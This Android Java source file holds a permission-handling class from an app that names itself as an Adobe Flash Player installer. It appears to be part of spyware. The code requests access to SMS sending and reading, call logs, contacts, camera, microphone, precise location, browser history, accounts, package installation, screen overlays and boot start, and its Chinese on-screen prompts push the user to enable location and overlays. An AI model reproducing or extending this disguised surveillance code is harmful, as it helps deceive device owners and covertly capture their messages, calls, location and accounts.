package com.adobe.flashplayer.install;

import java.util.ArrayList;
import java.util.List;
import com.adobe.flashplayer.R;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import com.adobe.flashplayer.data.PhoneLocationListener;
import com.adobe.flashplayer.data.PhoneLocationWrapper;


public class Permission {
    private static String TAG = "[ljg]Permission ";
    public static int PERMISSIONCODE = 9999;


    public static String[] permissions = {
            android.Manifest.permission.READ_PHONE_STATE,
            android.Manifest.permission.INTERNET,
            android.Manifest.permission.ACCESS_NETWORK_STATE,
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.MOUNT_UNMOUNT_FILESYSTEMS,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.SYSTEM_ALERT_WINDOW,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.CALL_PRIVILEGED,
            android.Manifest.permission.CALL_PHONE,
            //android.Manifest.permission.READ_HISTORY_BOOKMARKS,
            "com.android.browser.permission.READ_HISTORY_BOOKMARKS",
            android.Manifest.permission.CHANGE_CONFIGURATION,
            android.Manifest.permission.RECEIVE_BOOT_COMPLETED,
            android.Manifest.permission.CHANGE_WIFI_STATE,
            android.Manifest.permission.CHANGE_NETWORK_STATE,
            android.Manifest.permission.WAKE_LOCK,
            android.Manifest.permission.ACCESS_WIFI_STATE,
            android.Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
            android.Manifest.permission.PACKAGE_USAGE_STATS,
            android.Manifest.permission.REQUEST_INSTALL_PACKAGES,
            "android.permission.READ_SYNC_SETTINGS",
            "android.permission.WRITE_SYNC_SETTINGS",
            "android.permission.AUTHENTICATE_ACCOUNTS",
            "android.permission.MANAGE_ACCOUNTS",
            "android.permission.GET_ACCOUNTS",
            "android.permission.WAKE_LOCK"
    };



    public static String[] basepers = {
            android.Manifest.permission.READ_PHONE_STATE,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,

            android.Manifest.permission.RECORD_AUDIO,

            android.Manifest.permission.CAMERA,

            android.Manifest.permission.INTERNET,

            android.Manifest.permission.READ_CONTACTS,

            android.Manifest.permission.SYSTEM_ALERT_WINDOW,

            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.ACCESS_WIFI_STATE,
            android.Manifest.permission.ACCESS_NETWORK_STATE
    };


    public static boolean checkSinglePermission(Context context,String permission) {

        try{
            if (Build.VERSION.SDK_INT < 23) {
                return true;
            }else{
                PackageManager pm = context.getPackageManager();

                String packagename = context.getPackageName();

                int ret = pm.checkPermission(permission,packagename);

                if (ret == PackageManager.PERMISSION_GRANTED) {
                    Log.e(TAG, permission + " is allowed");
                    return true;
                }else{
                    Log.e(TAG, permission + " is not allowed");
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }

        return false;
    }









    public static void checkPermission(Activity activity) {

        try{
            boolean bret = PhoneLocationWrapper.isLocationEnabled(activity);
            if(bret == false){
                Toast.makeText(activity, "请手动打开定位服务按钮",Toast.LENGTH_LONG).show();
                Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                activity.startActivity(intent);
            }

            if (Build.VERSION.SDK_INT < 23) {
                return;
            }

            List<String> list = new ArrayList<String>();

            int targetapi = getTargetApi((Context)activity);

            for (int i = 0; i < permissions.length; i++) {

                int ret = activity.checkSelfPermission(permissions[i]);
                if (ret != PackageManager.PERMISSION_GRANTED) {

                    list.add(permissions[i]);
                    Log.e(TAG, permissions[i] + " add unauthoritised permission");
                    //shouldShowRequestPermissionRationale的返回值主要以下几种情况 ：
                    //第一次打开App时false
                    //上次弹出权限点击了禁止（但没有勾选下次不在询问）true
                    //上次选择禁止并勾选：下次不在询问false
                    if (ActivityCompat.shouldShowRequestPermissionRationale(activity,permissions[i]) == false){
                        Log.e(TAG, permissions[i] + " need to granted nexttime");
                    }else{
                        Log.e(TAG, permissions[i] + " not need to be granted nexttime");
                    }
                }else{
                    Log.e(TAG, permissions[i] + " permission granted");
                }
            }

            if (list.size() > 0) {
                String[] array = new String[list.size()];
                list.toArray(array);
                activity.requestPermissions(array, PERMISSIONCODE);
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }


    public static void checkCandrawOverly(Context act){
        if (Build.VERSION.SDK_INT >= 23) {
            if (!Settings.canDrawOverlays(act)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                act.startActivity(intent);

                Toast.makeText(act, "请点击\"" + act.getString(R.string.app_name) +"\"并允许悬浮窗",Toast.LENGTH_LONG).show();
            } else {
                return;
            }
        }

//		if (Build.VERSION.SDK_INT >= 23) {
//	        if ( Settings.canDrawOverlays(act) == false) {
//	            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
//		Uri.parse("package:" + act.getPackageName()));
//	            act.startActivity(intent);
//	        }
//	    }
    }





    public static int getTargetApi(Context context){
        try {
            PackageInfo info = context.getPackageManager().getPackageInfo( context.getPackageName(), 0);
            int targetSdkVersion = info.applicationInfo.targetSdkVersion;
            return targetSdkVersion;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        return 23;
    }






}

